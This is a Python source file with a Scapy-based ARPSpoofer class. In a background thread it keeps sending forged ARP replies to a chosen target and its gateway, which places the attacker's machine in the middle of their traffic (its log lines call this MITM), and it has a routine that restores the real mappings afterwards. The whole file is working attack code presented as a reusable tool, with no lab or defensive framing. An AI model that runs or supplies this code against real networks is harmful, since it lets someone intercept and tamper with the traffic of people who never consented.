from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr
import threading
import time
import subprocess

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip, target_mac, on_log):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.on_log = on_log
        self.running = False
        self.thread = None
        self.attacker_mac = get_if_hwaddr(interface)

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        self._restore_network()
        self.on_log(f"[!] Stopped MITM on {self.target_ip}")

    def _spoof_loop(self):
        self.on_log(f"[*] Starting ARP Spoofing on {self.target_ip}...")
        try:
            subprocess.run(["ping", "-c", "1", self.gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ping", "-c", "1", self.target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            gateway_mac = getmacbyip(self.gateway_ip)
            
            if not gateway_mac:
                self.on_log("[-] Could not get Gateway MAC address. Aborting.")
                self.running = False
                return

            while self.running:

                
                ether_to_target = Ether(src=self.attacker_mac, dst=self.target_mac)
                arp_to_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.attacker_mac)
                sendp(ether_to_target / arp_to_target, iface=self.interface, verbose=0)
                
                ether_to_gateway = Ether(src=self.attacker_mac, dst=gateway_mac)
                arp_to_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip, hwsrc=self.attacker_mac)
                sendp(ether_to_gateway / arp_to_gateway, iface=self.interface, verbose=0)
                
                time.sleep(0.5)
                
        except Exception as e:
            self.on_log(f"[-] Spoofing error: {e}")

    def _restore_network(self):
        self.on_log(f"[*] Restoring network for {self.target_ip}...")
        try:
            gateway_mac = getmacbyip(self.gateway_ip)
            if gateway_mac:
                ether_to_target = Ether(src=self.attacker_mac, dst=self.target_mac)
                arp_to_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
                sendp(ether_to_target / arp_to_target, iface=self.interface, verbose=0, count=5)
                
                ether_to_gateway = Ether(src=self.attacker_mac, dst=gateway_mac)
                arp_to_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
                sendp(ether_to_gateway / arp_to_gateway, iface=self.interface, verbose=0, count=5)
        except:
            pass
